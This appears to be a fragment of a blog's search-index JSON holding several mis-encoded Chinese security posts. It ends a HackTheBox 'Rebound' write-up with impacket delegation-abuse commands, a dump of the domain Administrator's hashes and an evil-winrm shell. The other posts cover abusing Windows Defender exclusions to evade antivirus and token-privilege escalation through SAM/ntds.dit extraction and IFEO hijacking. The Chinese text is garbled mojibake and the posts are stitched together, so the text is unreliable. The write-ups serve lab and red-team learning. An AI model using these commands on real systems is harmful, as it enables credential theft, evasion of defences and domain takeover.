248aa471b96f120b6d61861e57642ea5095a63a42a28d0bc96e392481dd251765ddaadfb5a7ac0c0c58071e864085008303a97f1c2552d91609e0e27fbeadf876be41e747df15b6ea6189f3d503ca4760b913dc720603405618ec1fd9f6e5134d5cd90f5900f5a6b4db0b372adfc659655fc906e22ea15bc8533ab608c1badb545c3f518e5b3a18c2a8af9263cb78d9f281f0117b8fb8de5a8be3d3443a0ad55e3dea2e5f090eabf0b54731589afbd28a32207b279fb7cea733c5499a83941ce2239d1914c807f01b7175f8e2c6aa7bdc0952f426bc12596f6abf6d2d6ac39bfdaa6b10c59a5e59d5e97460084735616d6738f657ad52c855ffeb6a9698fd6eeaf64bf7da68f6d81a7977d784c2366cc049cb66b8b523d151add5c82ced9c418afe566dd75b1dfde1f79eaf50949cc8e10ecc5d5949caef2d2edeee978ce7e791721637a403312c5851ce8a50bf7cac1701[*] Decoding unencrypted data in credential[0]['ticket']:[*] Service Name : delegator$[*] Service Realm : REBOUND.HTB[*] Encryption type : aes256_cts_hmac_sha1_96 (etype 18)[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied delegations-constrainedæ–‡ç« ä»‹ç»äº†å¦‚ä½•åŸºäºçº¦æŸå§”æ´¾åœ¨æ— åè®®è½¬æ¢çš„æƒ…å†µä¸‹é€šè¿‡RBCD(åŸºäºèµ„æºå§”æ´¾)åˆ©ç”¨ï¼› æˆ‘çš„ç†è§£:ldap_monitoræ˜¯ä¸€ä¸ªæœåŠ¡è´¦æˆ·ï¼›å°†â€delegator$â€æœºå™¨è´¦æˆ·çš„â€msDS-AllowedToActOnBehalfOfOtherIdentityâ€å±æ€§ä¿®æ”¹ä¸ºâ€ldap_monitorâ€çš„sidï¼Œä½¿å¾—ldap_monitorå¯ä»¥æ¨¡æ‹ŸDC01$ï¼Œæ‹¿åˆ°DC01$åˆ°â€delegator$â€å¯è½¬å‘çš„ST;è·å¾—ç¥¨è¯åï¼Œå¯ä»¥åœ¨ delegator$ä»£è¡¨æ¨¡æ‹Ÿç”¨æˆ·(DC01$)å‘å‡ºçš„ S4U2proxy è¯·æ±‚ä¸­ä½¿ç”¨ç¥¨æ®,ä½¿ç”¨æ­¤ç¥¨æ®ï¼Œå¯ä»¥è·å¾—delegator$å§”æ´¾DC01$çš„æœåŠ¡çš„æœåŠ¡ç¥¨æ®ï¼Œä»¥æ­¤è¾¾åˆ°æ»¥ç”¨å§”æ´¾çš„æ•ˆæœ è„šæœ¬å¦‚ä¸‹: 1234567891011impacket-getTGT rebound.htb/delegator\\$ -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 export KRB5CCNAME=delegator\\$.ccacherbcd.py 'rebound.htb/delegator$' -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldapsfindDelegation.py 'rebound.htb/delegator$' -dc-ip 10.10.11.231 -k -hashes :f7f7ea94cd22bd4129ca00bab335ceb9getST.py 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$getST.py rebound.htb/delegator\\$ -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -spn http/dc01.rebound.htb -additional-ticket DC01\\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache -impersonate DC01$ è¿è¡Œç»“æœå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ bash acl.shImpacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[*] Saving ticket in delegator$.ccacheImpacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[*] Accounts allowed to act on behalf of other identity:[*] ldap_monitor (S-1-5-21-4078382237-1492182817-2568127209-7681)[*] ldap_monitor can already impersonate users on delegator$ via S4U2Proxy[*] Not modifying the delegation rights.[*] Accounts allowed to act on behalf of other identity:[*] ldap_monitor (S-1-5-21-4078382237-1492182817-2568127209-7681)Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[*] Getting machine hostnameAccountName AccountType DelegationType DelegationRightsTo SPN Exists ------------ ----------------------------------- -------------------------- --------------------- ----------ldap_monitor Person Resource-Based Constrained delegator$ No delegator$ ms-DS-Group-Managed-Service-Account Constrained http/dc01.rebound.htb No Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[*] Impersonating DC01$[*] Requesting S4U2self[-] Kerberos SessionError: KRB_AP_ERR_BADMATCH(Ticket and authenticator don't match)Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[*] Impersonating DC01$[*] Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self[*] Requesting S4U2Proxy[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache æœ€åå°†ç¥¨æ®æä¾›ç»™secretsdump.pyï¼Œè·å¾—Administratorçš„hashï¼›ä½¿ç”¨evil-winrmè·å¾—ä¸€ä¸ªadministrator shell 12345678910111213141516171819202122232425262728293031â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ export KRB5CCNAME=DC01\\$@http_dc01.rebound.htb@REBOUND.HTB.ccache â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ secretsdump.py -k -no-pass dc01.rebound.htb -just-dc-user administratorImpacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431fAdministrator:des-cbc-md5:ad8ac2a825fe1080[*] Cleaning up... â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/windows/Rebound]â””â”€$ evil-winrm -i dc01 -u administrator -H 176be138594933bb67db3b2572fc91b8 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoamirebound\\administrator*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; hostnamedc01","link":"/2024/09/11/reBound/"},{"title":"æ»¥ç”¨AV/EDRçš„æ’é™¤æœºåˆ¶æ¥ç»•è¿‡æ£€æµ‹","text":"å‰è¨€åœ¨ä¸Šæµ·æŸæ”»é˜²æ¼”ç»ƒæ—¶ é€šè¿‡â€Geoserverâ€ååºåˆ—åŒ–æ¼æ´ä½œä¸ºå…¥å£ç‚¹æ‹¿ä¸‹ä¸€å°æœåŠ¡è´¦æˆ·ç”¨æˆ·çš„windowsæœºå™¨ï¼Œä¼—æ‰€å‘¨çŸ¥ï¼ŒæœåŠ¡è´¦å·é€šå¸¸å…·æœ‰â€SeImpersonatePrivilegeâ€ç‰¹æƒï¼Œå¯ç”¨æ­¤ç‰¹æƒé€šè¿‡åœŸè±†ææƒè‡³systemæƒé™ï¼›ä½†æ˜¯å½“æ—¶è¿™å°å…¥å£æœºé»˜è®¤å¼€å¯äº† Windows Defenderï¼ˆä½œä¸ºå¾®è½¯åœ¨ Windows ç³»ç»Ÿä¸­é»˜è®¤å†…ç½®çš„åç—…æ¯’è½¯ä»¶ï¼‰ï¼Œå¯¹ä¸€äº›å…¬å¼€ä¸”æœªåšå…æ€çš„å·¥å…·ä¼šç›´æ¥æŸ¥æ€ï¼Œå¯¼è‡´ä¸€äº›å·¥å…·æ— æ³•è½åœ°ã€‚ å› æ­¤ï¼Œæˆ‘åœ¨ææƒå’Œåç»­å†…ç½‘æ¸—é€ä¸­è¢«å¡ä½äº†ä¸€æ•´æ™š(å› ä¸ºæˆ‘ä¸æ“…é•¿å…æ€)ï¼›ç¬¬äºŒå¤©çš„æ—¶å€™è„‘å­å°±åœ¨æƒ³ï¼Œç«Ÿç„¶æˆ‘æ— æ³•é€šè¿‡å…æ€æ¥ç»•è¿‡defenderï¼Œè¿˜æœ‰æ²¡æœ‰å…¶ä»–æ¯”è¾ƒéªšçš„æŠ€å·§ï¼Ÿè¿˜çœŸæœ‰ï¼Œçªç„¶æƒ³èµ·æ¥ä¹‹å‰çœ‹è¿‡ä¸€ç¯‡è€å¤–çš„æ–‡ç« ï¼šâ€Abusing AV/EDR Exclusions to Evade Detectionsâ€œ,ä»‹ç»äº†å¦‚ä½•æ»¥ç”¨ AV/EDR çš„æ’é™¤æœºåˆ¶æ¥ç»•è¿‡æ£€æµ‹,å½“æ—¶è¯•äº†ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ï¼Œæ²¡æƒ³åˆ°åˆšå¥½æœ‰ä¸€ä¸ªç›®å½•è¢«win defenderæ’é™¤å¹¶ä¸”æ™®é€šç”¨æˆ·è¿˜å¯¹æ­¤ç›®å½•è¿˜æœ‰å†™çš„æƒé™ï¼›äºæ˜¯ï¼Œæˆ‘å°† â€œåœŸè±†â€ ææƒå·¥å…·ä¸Šä¼ åˆ°è¯¥æ’é™¤ç›®å½•ï¼ŒæˆåŠŸæ‰§è¡Œå¹¶ææƒåˆ° SYSTEM æƒé™ï¼Œéšåç«‹å³å…³é—­äº† Windows Defenderï¼›åé¢é™†ç»­ä¸Šä¼ fscanå’Œä»£ç†ç­‰å·¥å…·å¼€å§‹è¿›è¡Œå†…ç½‘æ¸—é€ã€‚ æ”»é˜²ç»“æŸä¹‹åï¼Œè§‰å¾—â€æ»¥ç”¨ AV/EDR çš„æ’é™¤æœºåˆ¶æ¥ç»•è¿‡æ£€æµ‹â€æ–¹æ³•æŒºæœ‰æ„æ€çš„ï¼Œå°±æƒ³ç€åˆ†äº«å‡ºæ¥ Win Defenderä¸­çš„æ’é™¤ç±»å‹ æ’é™¤ç±»å‹ å«ä¹‰ åœºæ™¯ç¤ºä¾‹ æ–‡ä»¶ï¼ˆFileï¼‰ æŒ‡å®šå•ä¸ªæ–‡ä»¶ä¸æ‰«æ æŸä¸ªè„šæœ¬ã€å·¥å…·ã€å¯æ‰§è¡Œæ–‡ä»¶ æ–‡ä»¶å¤¹ï¼ˆFolderï¼‰ æŒ‡å®šæ•´ä¸ªæ–‡ä»¶å¤¹ï¼ˆå«å­æ–‡ä»¶ï¼‰ä¸æ‰«æ ä¸´æ—¶ç›®å½•ã€æµ‹è¯•ç¯å¢ƒè¾“å‡ºç›®å½• æ–‡ä»¶ç±»å‹ï¼ˆFile Typeï¼‰ æŒ‰æ‰©å±•åæ’é™¤æŸç±»æ–‡ä»¶ æ¯”å¦‚æ’é™¤æ‰€æœ‰ .log æˆ– .bak æ–‡ä»¶ è¿›ç¨‹ï¼ˆProcessï¼‰ æŒ‡å®šæŸä¸ªè¿›ç¨‹ä¸å— Defender å®æ—¶ä¿æŠ¤ æ¯”å¦‚æŸäº›è‡ªç ”ç¨‹åºæˆ–è‡ªåŠ¨åŒ–å·¥å…· æšä¸¾ Win Defender æ’é™¤é¡¹ä½¿ç”¨æ­¤å‘½ä»¤å°±å¯ä»¥æŸ¥çœ‹å½“å‰æ’é™¤é¡¹çš„è¯¦ç»†ä¿¡æ¯ 1Get-MpPreference | Select-Object -Property ExclusionPath, ExclusionProcess, ExclusionExtension ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåªæœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·æ‰èƒ½æ‰§è¡Œæ­¤å‘½ä»¤ï¼Œå¦åˆ™ä¼šæŠ¥é”™æƒé™ä¸è¶³ï¼› é»˜è®¤æƒ…å†µä¸‹ï¼ŒDefender ä¼šè®°å½•é…ç½®æ›´æ”¹ï¼ŒåŒ…æ‹¬å¯¹æ’é™¤é¡¹çš„ä¿®æ”¹çš„ä¿¡æ¯ï¼›æ‰€ä»¥æšä¸¾ Win Defenderæ’é™¤é¡¹çš„å¦ä¸€ç§æŠ€å·§æ˜¯æ£€æŸ¥ Windows Defender æ“ä½œçš„äº‹ä»¶æ—¥å¿—ï¼Œè¿™äº›æ—¥å¿—å³ä½¿æ˜¯æ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥è¯»å–ï¼› å¯ä»¥åˆ©ç”¨æ­¤è„šæœ¬è§£ææ—¥å¿—å¹¶è¯†åˆ«æ’é™¤é¡¹ç›®ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172function Get-DefenderExclusions { param ( [string]$logName = &quot;Microsoft-Windows-Windows Defender/Operational&quot;, [int]$eventID = 5007, [switch]$Path, [switch]$Process, [switch]$Extension ) if (-not ($Path -or $Process -or $Extension)) { Write-Host &quot;Please specify at least one type of exclusion to filter: -Path, -Process, -Extension.&quot; return } # Get all event logs with the specified Event ID $events = Get-WinEvent -LogName $logName -FilterXPath &quot;*[System[(EventID=$eventID)]]&quot; -ErrorAction SilentlyContinue if (-not $events) { Write-Host &quot;No events found with Event ID $eventID in the $logName log.&quot; return } # Define the regex patterns for exclusion paths, extensions, and processes $patterns = @{ Path = &quot;HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths\\\\([^`&quot;]+)&quot; Extension = &quot;HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Extensions\\\\([^`&quot;]+)&quot; Process = &quot;HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Processes\\\\([^`&quot;]+)&quot; } # Function to parse and return unique exclusions function Get-UniqueExclusions { param ( [string]$pattern, [string]$exclusionType ) $uniqueExclusions = @{} foreach ($event in $events) { $message = $event.Message if ($message -match $pattern) { $exclusionDetail = $matches[1] -replace ' = 0x0.*$', '' -replace 'New value:', '' -replace '^\\s+|\\s+$', '' if (-not $uniqueExclusions.ContainsKey($exclusionDetail) -or $event.TimeCreated -gt $uniqueExclusions[$exclusionDetail]) { $uniqueExclusions[$exclusionDetail] = $event.TimeCreated } } } return $uniqueExclusions.GetEnumerator() | Sort-Object Value -Descending | ForEach-Object { [PSCustomObject]@{ ExclusionDetail = $_.Key TimeCreated = $_.Value } } } # Extract and display exclusions based on the provided arguments if ($Path) { Write-Host &quot;Path Exclusions:&quot; Get-UniqueExclusions -pattern $patterns.Path -exclusionType 'Path' | Format-Table -Property ExclusionDetail, TimeCreated -AutoSize -Wrap } if ($Process) { Write-Host &quot;Process Exclusions:&quot; Get-UniqueExclusions -pattern $patterns.Process -exclusionType 'Process' | Format-Table -Property ExclusionDetail, TimeCreated -AutoSize -Wrap } if ($Extension) { Write-Host &quot;Extension Exclusions:&quot; Get-UniqueExclusions -pattern $patterns.Extension -exclusionType 'Extension' | Format-Table -Property ExclusionDetail, TimeCreated -AutoSize -Wrap }}# Example usage:# Get-DefenderExclusions -Path -Process -Extension# Get-DefenderExclusions -Process ç”±ä¸‹å›¾å°±å¯ä»¥çœ‹åˆ°ï¼Œå³ä½¿æ˜¯æ™®é€šç”¨æˆ·ä¹Ÿæœ‰æ–¹æ³•å¾—åˆ°â€win defenderâ€çš„æ’é™¤é¡¹ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥æ»¥ç”¨ï¼› æ³¨æ„ï¼šå¦‚æœä½ åœ¨æœ¬åœ°æµ‹è¯•æ—¶ï¼Œç”¨ç®¡ç†å‘˜æƒé™æ‰§è¡Œå‘½ä»¤å‘ç°æœ‰æ’é™¤é¡¹ï¼Œä½†æ˜¯ä½¿ç”¨è„šæœ¬å´æ²¡æœ‰è¾“å‡ºæ’é™¤é¡¹ï¼Œè¿™ç§æƒ…å†µå¤§æ¦‚æ˜¯ä½ çš„5007äº‹ä»¶idçš„æ—¥å¿—è¢«æ¸…é™¤æˆ–è€…ä¸å®Œæ•´ï¼› å‚è€ƒhttps://medium.com/seercurity-spotlight/abusing-av-edr-exclusions-to-evade-detections-21fe31d7ed49","link":"/2025/07/16/%E6%BB%A5%E7%94%A8%20AV%20EDR%20%E7%9A%84%E6%8E%92%E9%99%A4%E6%9C%BA%E5%88%B6%E6%9D%A5%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B/"},{"title":"Windows ç‰¹æƒæå‡","text":"å‰è¨€è®°å½•æœ¬äººåœ¨ Windows ç¯å¢ƒä¸­é‡åˆ°è¿‡çš„ç‰¹æƒææƒæ–¹æ³•ã€‚ SeImpersonatePrivilegeé€šå¸¸æœåŠ¡è´¦æˆ·ï¼ˆå¦‚ LOCAL SERVICEã€NETWORK SERVICEï¼‰éƒ½æ‹¥æœ‰æ­¤ç‰¹æƒï¼Œä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„ææƒæ–¹å¼ä¹‹ä¸€ã€‚ å¯ä»¥é€šè¿‡è¯±å¯¼ Windows æœåŠ¡ï¼ˆå¦‚ DCOMï¼‰æ‰§è¡Œ NTLM èº«ä»½éªŒè¯ï¼Œè·å–ç‰¹æƒä»¤ç‰Œï¼Œä»è€Œä»¥ SYSTEM æƒé™æ‰§è¡Œè¿›ç¨‹ã€‚ å®ç”¨å·¥å…· ğŸ‘‰ GodPotato ç¤ºä¾‹ï¼š æ³¨æ„:åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼ŒLOCAL SERVICE æˆ– NETWORK SERVICE å¯èƒ½ä¼šå—åˆ°é™åˆ¶è€Œæ²¡æœ‰ SeImpersonatePrivilegeï¼Œå¯ä»¥ç”¨ FullPowers æ¢å¤ï¼šreproducing-the-conditions-of-the-exploit SeBackupPrivilegeæ‹¥æœ‰è¯¥ç‰¹æƒçš„è¿›ç¨‹å¯å¯¹ä»»ä½•æ–‡ä»¶/å¯¹è±¡è¿›è¡Œæ— è§† ACL çš„è¯»è®¿é—®ï¼Œå¸¸è§äº Backup Operators ç»„ã€‚ å…¸å‹åˆ©ç”¨ï¼š çªƒå– SAMã€SYSTEMã€NTDS.ditï¼Œè§£å¯†è·å¾— NTLM å“ˆå¸Œã€‚ å·¥ä½œç»„ç¯å¢ƒä¸‹åˆ©ç”¨ï¼š 1234reg save HKLM\\SAM SAMreg save HKLM\\SYSTEM SYSTEMimpacket-secretsdump -sam ./SAM -system ./SYSTEM local åŸŸç¯å¢ƒä¸­ï¼š éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåŸŸæ§åˆ¶å™¨å’Œ Windows è®¡ç®—æœºä¹‹é—´çš„æ¼æ´åˆ©ç”¨æ–¹æ³•å­˜åœ¨å·®å¼‚ã€‚ã€‚è¿™æ˜¯å› ä¸ºï¼Œå¯¹äº DCï¼Œè¯¥æƒé™ä»…å…è®¸æ‚¨è¿›è¡Œå¤‡ä»½ï¼Œè€Œä¸èƒ½è¿›è¡Œå¤åˆ¶ã€‚åœ¨ç‹¬ç«‹ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¤åˆ¶ åœ¨åŸŸæ§åˆ¶å™¨ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ ntds.dit æ–‡ä»¶æ¥æå–å“ˆå¸Œå€¼ä»¥åŠSYSTEMï¼›ntds.dit æ–‡ä»¶çš„é—®é¢˜åœ¨äºï¼Œå½“ç›®æ ‡æœºå™¨æ­£åœ¨è¿è¡Œæ—¶ï¼Œè¯¥æ–‡ä»¶å§‹ç»ˆå¤„äºä½¿ç”¨çŠ¶æ€ï¼Œå¹¶ä¸”æˆ‘ä»¬éå¸¸æ¸…æ¥šï¼Œå½“æ–‡ä»¶æœªå……åˆ†ä½¿ç”¨æ—¶ï¼Œå°±ä¸å¯èƒ½ä½¿ç”¨ä»»ä½•æ–¹å¼å¤åˆ¶è¯¥æ–‡ä»¶ã€‚å¸¸è§„æ–¹æ³•ã€‚ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨diskshadowåŠŸèƒ½ã€‚è¿™æ˜¯Windowsçš„å†…ç½®åŠŸèƒ½ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬åˆ›å»ºå½“å‰æ­£åœ¨ä½¿ç”¨çš„é©±åŠ¨å™¨çš„å‰¯æœ¬ã€‚ æœ‰ä¸€äº›ä½¿ç”¨ diskshadow çš„æ–¹æ³•ï¼Œå…¶ä¸­åŒ…æ‹¬åœ¨ diskshadow shell ä¸­æä¾›æŒ‡ä»¤ï¼Œä½†è¿™å¾€å¾€æœ‰ç‚¹æ£˜æ‰‹ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªåˆ†å¸ƒå¼ Shell æ–‡ä»¶æˆ– dsh æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å« diskshadow è¿è¡Œæ‰€éœ€çš„æ‰€æœ‰å‘½ä»¤ï¼Œå¹¶åˆ›å»º Windows é©±åŠ¨å™¨çš„å®Œæ•´å‰¯æœ¬ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥æå– ntds.dit æ–‡ä»¶ä»ã€‚ æ¥ä¸‹æ¥é€šè¿‡windowsè‡ªå¸¦çš„â€diskshadowâ€å·¥å…·å’Œâ€robocopyâ€å·¥å…·æ‹¿åˆ° ntds.ditæ–‡ä»¶ï¼› å°†ä¸‹é¢çš„å†…å®¹ä¿å­˜è‡³ script.txtæ–‡ä»¶;è¿™äº›å†…å®¹æ˜¯diskshadowçš„æ“ä½œæŒ‡ä»¤ï¼Œå…·ä½“ä½œç”¨å°±æ˜¯å°†Cç›˜å¤‡ä»½ä¸€ä»½åˆ°Eç›˜ 12345678set metadata C:\\Windows\\Temp\\meta.cabset context clientaccessibleset context persistentbegin backupadd volume C: alias cdrivecreateexpose %cdrive% E:end backup è¿è¡Œâ€diskshadow â€; 1diskshadow /s script.txt robocopy: è¿™æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡ä»¶å¤åˆ¶å‘½ä»¤è¡Œå·¥å…·ï¼›**/b**: è¡¨ç¤ºä»¥å¤‡ä»½æ¨¡å¼è¿è¡Œï¼› å°†â€E:\\Windows\\ntds\\ntds.ditâ€œæ–‡ä»¶å¤åˆ¶åˆ°å½“å‰ç›®å½• 1robocopy /b E:\\Windows\\ntds . ntds.dit 1æˆ‘ä»¬ç°åœ¨æ‹¥æœ‰ ntds.dit æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦æå–SYSTEMã€‚è¿™å¯ä»¥é€šè¿‡ç®€å•çš„ reg save å‘½ä»¤æ¥å®Œæˆï¼Œ 123reg save HKLM\\SYSTEM .\\SYSTEMimpacket-secretsdump -system SYSTEM -ntds ntds.dit local SeRestorePrivilegeå…è®¸å¯¹ä»»ä½•æ–‡ä»¶/å¯¹è±¡æ‰§è¡Œå†™è®¿é—®ï¼Œå¸¸ç”¨æ‰‹æ³•æ˜¯ IFEOï¼ˆImage File Execution Optionsï¼‰æ˜ åƒåŠ«æŒï¼š Image File Execution Options ç®€å•çš„è¯´ï¼Œé€šè¿‡ä¿®æ”¹æŒ‡å®šæ³¨å†Œè¡¨é¡¹å®ç°ç¨‹åºçš„åŠ«æŒï¼Œå³è¿è¡ŒæŒ‡å®šç¨‹åºå®é™…ä¸Šè¿è¡Œçš„æ˜¯æˆ‘ä»¬è‡ªå·±çš„åé—¨ç¨‹åºï¼›ä¸€ä¸ªç¨‹åºè¦è¢«è¿è¡Œæ—¶ï¼Œä¼šå…ˆæ£€æŸ¥æ³¨å†Œè¡¨ï¼Œå¦‚æœæœ‰æŒ‡å®šç¨‹åºå¹¶ä¸”å¼€å¯äº†debuggerï¼Œé‚£ä¹ˆä¼šä¼˜å…ˆæ‰§è¡ŒdebuggeræŒ‡å®šçš„ç¨‹åºï¼Œè¿™æ ·ä¹Ÿå°±é€ æˆäº†æ˜ åƒåŠ«æŒã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šâ€œmagnify.exeâ€æœ¬æ¥æ˜¯æ”¾å¤§é•œçš„æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨å…¶æ³¨å†Œè¡¨ä¸­æ·»åŠ ä¸€ä¸ªâ€REG_SZâ€ï¼Œâ€œDebuggerâ€æŒ‡å‘cmd.exe; å½“æˆ‘ä»¬åœ¨ç™»é™†é¡µé¢ç‚¹å‡»æ”¾å¤§é•œï¼Œå°±ä¼šä»¥â€systemâ€ç”¨æˆ·çš„æƒé™è¿è¡Œä¸€ä¸ªâ€cmd.exeâ€ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯ä»¥ç›´æ¥é€šè¿‡regå‘½ä»¤è®¾ç½®æ˜ åƒåŠ«æŒã€‚è¿™æ˜¯å› ä¸ºåœ¨regå‘½ä»¤å†…éƒ¨ä¼šè‡ªåŠ¨è°ƒç”¨AdjustTokenPrivileges()å‡½æ•°ä¸ºå½“å‰è¿›ç¨‹å¼€å¯ SeRestorePrivilege ç‰¹æƒ 1reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\\Windows\\System32\\cmd.exe&quot; å› ä¸ºå¯ä»¥åœ¨ä»»æ„ç›®å½•å†™æ–‡ä»¶ï¼Œè¿™æ„å‘³ç€è¿˜å¯ä»¥åŠ«æŒdllæ¥æå‡æƒé™ï¼Œä¸€ç¯‡ä¸é”™çš„æ–‡ç« ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±çœ‹ï¼Œæ¨è ğŸ‘‰ Phantom DLL Hijacking SeTakeOwnershipPrivilegeSeTakeOwnershipPrivilege ç‰¹æƒåœ¨æ”»å‡»é¢ä¸Šç±»ä¼¼äº SeRestorePrivilegeï¼Œç”±äºå¯ä»¥æ¥ç®¡ä»»æ„å¯¹è±¡ï¼Œå› æ­¤å¯ä»¥ä¿®æ”¹å¯¹è±¡çš„ ACLã€‚æˆ‘ä»¬é€šè¿‡ä¿®æ”¹ Image File Execution Options æ³¨å†Œè¡¨æˆ–ç³»ç»Ÿèµ„æºçš„ DACLï¼Œä½¿æˆ‘ä»¬æ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™ï¼Œå¹¶é€šè¿‡æ˜ åƒåŠ«æŒã€DLL åŠ«æŒæˆ–åŠ«æŒæœåŠ¡ç­‰æ–¹æ³•æ¥è·å¾—æœ¬åœ°ç‰¹æƒæå‡ SeTakeOwnershipPrivilege å…è®¸æ‚¨æ›´æ”¹æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æ‰€æœ‰æƒï¼Œä½¿æ‚¨èƒ½å¤Ÿä¿®æ”¹æˆ–è®¿é—®å—é™æ–‡ä»¶ã€‚è·å¾—æ‰€æœ‰æƒåï¼Œæ‚¨å¯ä»¥æ›´æ”¹å…¶è‡ªä¸»è®¿é—®æ§åˆ¶åˆ—è¡¨ (DACL) ï¼Œä»¥æˆäºˆè‡ªå·±å®Œå…¨æ§åˆ¶æƒã€‚ ä½¿ç”¨ takeown å‘½ä»¤æ¥è·å–æ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰æƒ(æˆ‘ç”¨hostsæ–‡ä»¶ä¸¾ä¾‹) 1takeown /F C:\\Windows\\System32\\drivers\\etc\\hosts æ­¤å‘½ä»¤å°†æŒ‡å®šæ–‡ä»¶çš„æ‰€æœ‰æƒæ›´æ”¹ä¸ºä½ çš„ç”¨æˆ·å¸æˆ·ã€‚ å–å¾—æ‰€æœ‰æƒåï¼Œä½¿ç”¨ icacls å‘½ä»¤ä¿®æ”¹æ–‡ä»¶çš„æƒé™ï¼Œä»¥è·å¾—å®Œå…¨æ§åˆ¶æƒ 1icacls C:\\Windows\\System32\\drivers\\etc\\hosts /grant &lt;username&gt;:F æˆäºˆè‡ªå·±å®Œå…¨æ§åˆ¶æƒåï¼Œå°±æœ‰æƒé™ä¿®æ”¹æ–‡ä»¶äº†ï¼› è¿˜å¯ä»¥ä½¿ç”¨ SeTakeOwnershipPrivilege ä¿®æ”¹å…³é”®æ³¨å†Œè¡¨é¡¹çš„æ‰€æœ‰æƒå’Œæƒé™ï¼Œå¯ä»¥ä¿®æ”¹â€image file exectuion optionsâ€çš„æ‰€æœ‰è€…ï¼Œæ¥é•œåƒåŠ«æŒï¼› SeManageVolumePrivilegeæ­¤ç‰¹æƒå¯ä»¥æˆäºˆè®¡ç®—æœºä¸Šæ‰€æœ‰ç”¨æˆ·å¯¹ â€œC:\\â€ é©±åŠ¨å™¨çš„å®Œå…¨æƒé™ï¼Œåˆ©ç”¨ï¼šhttps://github.com/CsEnox/SeManageVolumeExploit æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥å¯¹â€c:\\â€œç›®å½•æ–‡ä»¶æœ‰å®Œå…¨æ§åˆ¶æƒé™ï¼Œä¸‹ä¸€æ­¥å¯ä»¥è¿›è¡ŒDLLåŠ«æŒï¼› åç»­è¿˜æœ‰å…¶ä»–å¯ç”¨äºææƒçš„ç‰¹æƒ ğŸ‘‰ privilege-escalation-abusing-tokens åç»­é‡åˆ°å†è®°å½• ğŸ˜€","link":"/2025/07/20/windows%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/"},{"title":"DPAPI 